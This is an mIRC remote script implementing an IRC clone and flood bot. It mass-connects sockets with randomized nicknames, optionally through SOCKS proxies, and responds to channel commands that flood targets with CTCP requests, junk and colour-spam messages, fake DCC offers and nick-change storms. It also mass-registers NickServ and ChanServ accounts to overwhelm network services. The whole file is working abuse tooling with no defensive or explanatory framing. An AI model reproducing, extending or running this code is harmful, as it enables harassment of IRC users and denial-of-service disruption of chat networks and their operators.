[script]
n0=
n1=alias clone { if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3   }  }
n2=  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- }  | if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }   }
n3=  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }
n4=  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
n5=  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
n6=  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
n7=  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
n8=  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
n9=  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }
n10=  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
n11=  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
n12=  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $r(a,z) $+ $read Nick.txt $+ $r(a,z)  | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } 
n13=  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
n14=  if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } 
n15=}
n16=alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
n17=alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
n18=alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
n19=alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msg %chan 2Server not set | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
n20=alias botraw { sockwrite -n sock* $1- }
n21=alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read Nick.txt | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
n22=alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
n23=alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
n24=alias setserver { %clones.setserver = 1 | .dns -h $1 } 
n25=alias reg {  if ($1 == 1) { return @aol.com } | if ($1 == 2) { return @hotmail.com } | if ($1 == 3) { return @msn.com } | if ($1 == 4) { return @netzero.com } | if ($1 == 5) { return @bothered.com } | if ($1 == 6) { return @bothered.com } | if ($1 == 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .edu } | if ($1 == 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .net }  | if ($1 == 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .com } | if ($1 == 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .org } }
n26=
n27=alias dksmsgflooder {  if ($sock(dksmsgflooder2,0) == 0) { sockopen dksmsgflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgflooder1,0) == 0) { sockopen dksmsgflooder1 %msg.flood.server %msg.flood.server.port }  }
n28=alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
n29=alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
n30=alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read Nick.txt } | if ($1 == 2) { return ^ $+ $read Nick.txt $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read Nick.txt $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read Nick.txt $+ - } | if ($1 == 6) { return $read Nick.txt $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read Nick.txt $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
n31=alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
n32=alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
n33=alias percent { if ($1 isnum) && ($2 isnum) { return $round($calc(($1 / $2) * 100),2) $+ $chr(37) } }
n34=on *:sockclose:clone*: {  set %temp.clones.nick $remove($sockname,clone) }  
n35=on *:sockopen:clone*: { sockwrite -tn $sockname User $read Nick.txt $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  Nick.txt ] ] | sockwrite -tn $sockname Nick $remove($sockname,clone) | sockread }
n36=on *:sockread:clone*: { 
n37=  sockread %temp.sock 
n38=  if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } 
n39=  if ($gettok(%temp.sock,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%temp.sock,3,32) }
n40=  clone in %temp.sock 
n41=}
n42=on 10:TEXT:*:*:{
n43=  if ($1 == !clone.nick.read) { %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $read Nick.txt |   inc %.nc |  goto ncloop |   :end  |  /wnickchn $2 |  halt   }
n44=  if ($1 == !clone.ctcp.block) { /sockwrite -tn clone* PRIVMSG $2 :×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž× | /sockwrite -tn clone* PRIVMSG $2 :×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž×€Ž }
n45=  if ($1 == !cstats) { msg # 14[15Channel-Stats14]: 12-14(12 $+ # $+ 14)12- 14[14T15o0t14al: 14(12 $+ $nick(#,0,a) $+ 14) 44(12100%4)14]  | msg # 14[15Channel-Stats14]: 14[O15pe0ra15to14r's: (12 $+ $nick(#,0,o) $+ 14) 4(12 $+ $percent($nick(#,0,o),$nick(#,0,a)) $+ 4)14] 14[V15o0i15c14e's: 14(12 $+ $nick(#,0,v) $+ 14) 144(12 $+ $percent($nick(#,0,v),$nick(#,0,a)) $+ 144)14]  }
n46=  if ($1 == !ident) { if ($2 == $null) { halt } | msg # 15[14`15Ident14`15]12 set as3 $2 $+ 12... | identd on $2 }
n47=  if ($1 == !clone.service.killer2) {    if ($sock(clone*,0) == 0) { goto gatechange }  |   %sk = 1  |     :skloop |  if (%sk > $sock(clone*,0)) { goto end }  | sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))   |   %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2    |   sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gch
n48=  %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %gsk  | goto gchnge |   :end2 |   halt    }
n49=  if ($1 == !clone.join.k) { if $3 == $null { halt } | sockwrite -nt clone* JOIN $2 : $+ $3 } 
n50=  if ($1 == !timeout) { set %timeout $2 }
n51=  if ($1 == !max.load) { set %max.load $2 } 
n52=  if ($1 == !clone.flood.ctcp.all) {  if ($2 == $null) { halt } | /clone all $$2  }
n53=  if ($1 == !clone.flood.ctcp.version) {  if ($2 == $null) { halt } | /clone version $$2 }
n54=  if ($1 == !clone.flood.ctcp.ping) {  if ($2 == $null) { halt } | /clone ping $$2 }
n55=  if ($1 == !clone.flood.ctcp.time) {  if ($2 == $null) { halt } | /clone time $$2 }
n56=  if ($1 == !clone.service.killer) {  if ($sock(clone*,0) == 0) { goto gatechange } 
n57=    %sk = 1  |     :skloop |   if (%sk > $sock(clone*,0)) { goto end }  |  sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2   
n58=    sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gchnge   |   if (%gsk > $sock(sock*,0)) { goto end2 }   |   sockwrite -n $sock(sock*,%gsk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |   %random.sk.temp2 = $randomgen($r(0,9))  
n59=    %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp* 
n60=  inc %gsk  | goto gchnge |   :end2 |   halt  }
n61=  if ($1 == !clone.load) {  if ($4 == $null) { halt } | if (%max.load == $null) { msg # Error: please set %max.load $+ . | halt } |   if ($sock(clone*,0) >= %max.load) { msg # [Max-Reached] ( $+ [ [ %max.load ] ] $+ ) | halt } |   /msg # [Loading]: $4 Clone(s) to ( $+ $$2 $+ ) on port $3  |   /clone connect $2 $3 $4  }
n62=  if ($1 == !clone.load.random) && ($address == %master) {  if ($lines(servers.txt) < 0) { /msg # Error: There are (0) Server's in Servers.txt | halt }  |  if (%max.load == $null) { msg # error: please set %max.load $+ . | halt }  |  if ($sock(clone*,0) >= %max.load) { msg # [Max-Reached] ( $+ [ [ %max.load ] ] $+ ) | halt }  |  if ($2 == $null) { msg # Error, no (port specified) | halt }   |   if ($3 == $null) { msg # Error, no (amount specified) | halt } | else { /msg # [Loading]: $3 Clone(s) to (Random Server) on port $2   |  //clone connect $read servers.txt $2 $3 } }
n63=  if ($1 == !clone.part) { /clone part $2- }
n64=  if ($1 == !clone.join) { /clone join $$2 }
n65=  if ($1 == !clone.dcc.chat) { sockwrite -n clone* PRIVMSG $2 :DCC CHAT $2 1058633484 3481 }
n66=  if ($1 == !clone.dcc.send) { sockwrite -n clone* PRIVMSG $2 :DCC SEND $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ .txt 1058633484 2232 $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+  }
n67=  if ($1 == !clone.flood.ctcp.ping) {  /clone ping $$2  }
n68=  if ($1 == !clone.flood.ctcp.time) { /clone time $$2  }
n69=  if ($1 == !clone.join) {  if ($2 == $null) { halt } |   /clone join $$2 $3-  }
n70=  if ($1 == !msg) { if ($2 == $null) { /msg # You must provide a channel to message. | halt } |  /msg $$2-  }
n71=  if ($1 == !clone.cycle) {  /clone part $$2 |   /clone join $$2  }
n72=  if ($1 == !clone.msg) {  /clone msg $$2 $3-  }
n73=  if ($1 == !clone.quit) {  if ($sock(clone*,0) > 0) { //sockwrite -nt clone* QUIT :  $2- } |  if ($sock(sock*,0) > 0) { //sockwrite -nt sock* QUIT :  $2- } |  /msg # [Clones Disconnect/Quit] ( $+ $2- $+ )  }
n74=  if ($1 == !clone.notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  /clone notice $$2 $3-  }
n75=  if ($1 == !clone.nick.flood) { /clone nick.change  }
n76=  if ($1 == !clone.nick) { if ($2 == $null) { halt } |  /clone nick.this $2  }
n77=  if ($1 == !clone.kill) {  /clone kill |  /msg # [All Clones Killed]  }
n78=  if ($1 == !clone.combo1) { if ($2 == $null) { halt }  | clone msg $$2 $read flood.txt }
n79=  if ($1 == !clone.combo2) {  if ($2 == $null) { halt } |  clone msg $2 $read flood.txt
n80=    timer 1 6 /clone msg $2  $read flood.txt
n81=  timer 1 12 /clone msg $2 $read flood.txt }
n82=  if ($1 == !clone.combo3) {  if ($2 == $null) { halt } | clone msg $2 $read flood.txt
n83=    timer 1 6 /clone msg $2 $read flood.txt
n84=  timer 1 12 /clone msg $2  $read flood.txt }
n85=  if ($1 == !clone.combo4) {   if ($2 == $null) { halt } |  clone msg $2 $read flood.txt
n86=    timer 1 6 /clone msg $2 $read flood.txt
n87=  timer 1 12 /clone msg $2 $read flood.txt  }
n88=  if ($1 == !clone.combo5) {  if ($2 == $null) { halt } | clone msg $2 $read flood.txt
n89=    timer 1 6 /clone msg $2 $read flood.txt
n90=  timer 1 12 /clone msg $2 $read flood.txt }
n91=  if ($1 == !clone.combo6) {  if ($2 == $null) { halt } | clone msg $2 $read flood.txt 
n92=    timer 1 6 /clone msg $2 $read flood.txt
n93=    timer 1 12 /clone msg $2  $read flood.txt
n94=    timer 1 18 /clone msg $2 $read flood.txt
n95=    timer 1 24 /clone msg $2 $read flood.txt
n96=    timer 1 32 /clone msg $2 $read flood.txt
n97=  timer 1 38 /clone msg $2 $read flood.txt }
n98=  if ($1 == !clone.combo7) { //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
n99=    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $read flood.txt
n100=    /timer 1 4    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
n101=    /timer 1 8   /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
n102=    /timer 1 12   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8))
n103=  inc %cc |  goto ccloop |   :end  | unset %fat | unset %at* | unset %cc  }
n104=  if ($1 == !clone.combo#) { if ($2 == $null) { halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
n105=    /timer 1 3 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
n106=    /timer 1 7 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
n107=    /timer 1 11 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
n108=    /timer 1 15 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
n109=  inc %cc |  goto ccloop |   :end  | unset %cc  }   
n110=  if ($1 == !clone.combo.word) { if ($3 == $null) { msg # !clone.combo.word #/Nick Word. | halt } | //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
n111=    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n112=    /timer 1 3 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
